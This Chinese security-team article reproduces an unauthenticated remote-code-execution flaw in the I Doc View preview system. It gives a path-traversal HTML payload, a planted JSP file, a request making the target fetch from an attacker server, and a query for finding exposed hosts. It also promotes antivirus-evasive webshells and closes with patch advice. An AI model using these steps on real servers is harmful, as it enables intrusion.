#  QVD-2023-45061：I Doc View在线文档预览系统RCE漏洞   
原创 Locks_  Timeline Sec   2023-12-26 18:30  
  
> 关注我们❤️，添加星标🌟，一起学安全！作者：Locks_@Timeline Sec 本文字数：1042 阅读时长：2～3min 声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
  
## 0x01 简介  
  
I Doc View 在线文档预览系统是由北京卓软在线信息技术有限公司开发的一套系统。主要为用户提供各种类型的文档文件的在线预览，而无需下载或安装相应的软件。  
## 0x02 漏洞概述  
  
**漏洞编号：QVD-2023-45061**  
  
I Doc View 在线文档预览系统存在远程代码执行漏洞，未经身份验证的远程攻击者利用 "/html/2word?url=" 接口可使服务器远程下载恶意文件，从而执行任意代码。  
## 0x03 影响版本  
  
iDocView < 13.10.1_20231115  
## 0x04 环境搭建  
  
有条件的请移步这边  
```
申请安装到您自己服务器的一个月免费试用版，请填写一下这个申请表：
https://wj.qq.com/s2/5983516/63c4/

```  
  
语法查询：  
```
title == "在线文档预览 - I Doc View"

```  
## 0x05 漏洞复现  
  
第一步：最好在vps上创建一个新的文件夹复现  
  
**vim timelinesec.html**构造html文件  
```
<!DOCTYPE html>
<html lang="en">
<head>
    <title>test</title>
</head>
<body>
  <link href="/..\..\..\docview\locks.jsp">
</body>
</html>

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgDBVI6viaLHxnbgVE1phQY4yopT83nbrmnBxiaAmibXpsf5llfN0jMnV8DY3jdr3ELMTTMXiaznKnYUw/640?wx_fmt=png&from=appmsg "")  
  
构造恶意文件  
```
vi '..\..\..\docview\locks.jsp'
 
 
<%out.print("Locks_");%>

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgDBVI6viaLHxnbgVE1phQY4ZnTecwicMUKIVeM85ib7lspOtyy1B7hK7UKHefLy0rffqlhDPick8s77g/640?wx_fmt=png&from=appmsg "")  
  
在服务器开启python的http服务  
```
python3.10 -m http.server 80

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgDBVI6viaLHxnbgVE1phQY46oVMZyHhRyjeksa4uYRCUzlb982Q0zDcAHaEwf9xkCfFvNZAa2smRQ/640?wx_fmt=png&from=appmsg "")  
  
然后在 I Doc View 在线文档预览系统上访问路径 ：  
```
http://your-ip/html/2word?url=http://your-vps-ip/timelinesec.html

```  
```
https://xxx.xx.xx.xx:84/html/2word?url=http://your-vps-ip/timelinesec.html

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgDBVI6viaLHxnbgVE1phQY4MGbugMZZqicdYfWFtgBSHNlQaoVVojun0TQMtQrkNribxrDS1TrAWVeQ/640?wx_fmt=png&from=appmsg "")  
  
其他都是之前测试用的，不用在意
当两个请求都响应200时会下载一个word文件，表示利用成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgDBVI6viaLHxnbgVE1phQY47zW8lwibZC6tQTibUdj6njTBSN1q83I5rKjkXbqoibBmEMDQqSwSnMcqQ/640?wx_fmt=png&from=appmsg "")  
  
访问locks.jsp验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgDBVI6viaLHxnbgVE1phQY4jbUUlM68eEnILT1riaTuUSrbBcqP0bShW5tOmkUNUUicfTIqDsX6T4Rw/640?wx_fmt=png&from=appmsg "")  
  
tips：上传的马子需要是免杀后才能上传成功（公众号后台回复“  
231226”获取免杀工具地址）  
  
上传的手法一样，多等一会，让子弹飞一会  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgDBVI6viaLHxnbgVE1phQY4j1olJsYytmiazgj8YlRWAJ5WC74PdMSiaY6icF84fvK9dNM1wFQoTtMKA/640?wx_fmt=png&from=appmsg "")  
  
漏洞分析：解析应用中的远程页面缓存功能没有对输入的URL进行充分的安全验证，通过构造特殊的URL，使得应用下载恶意文件  
## 0x06 修复方式  
  
**1、官方修复方案：**厂商已禁用漏洞相关接口并升级软件版本到13.10.1_20231115，客户可升级到该版本解决漏洞，官网https://api.idocv.com已升级到最新版本。  
  
**2、临时修复方案：**a.使用防护类设备对相关资产进行防护；b.如非必要，避免将资产暴露在互联网；如有需要可通过网络ACL策略限制访问来源，只允许特定IP进行访问；c.限制服务器主动访问外部陌生链接。  
  
  
**推荐服务**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/VfLUYJEMVsjT9XsXuYuJ5o1RJZ95l1HcXV5tiaKbHOU6uPrSgotxOAWBYGLbxmjWj4bib26lsefdkTR94Zj8Djdw/640?wx_fmt=gif "")  
  
  
**历史漏洞**  
  
I Doc View在线文档预览系统存在弱口令I Doc View在线文档预览系统 view 任意文件读取漏洞I Doc View在线文档预览系统 upload 任意文件读取漏洞I Doc View在线文档预览系统 view 服务端请求伪造I Doc View在线文档预览系统system rce  
  
  
**后台功能**  
  
回复【  
1  
】领取新人学习资料回复【  
2  
】进入漏洞查询功能回复【  
3  
】获取加群方式  
  
回复【  
4  
】进入SRC-QQ交流群  
  
  
**商务合作**  
  
[Timeline Sec团队可合作项目清单](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247491949&idx=1&sn=5fd239d21a4a07859707b810c2a431ab&chksm=903ac79da74d4e8bf12c52fa3f3a0b14a9fbca35472362d4c40a4d9a6968a16e8d449896889c&scene=21#wechat_redirect)  
  
  
  
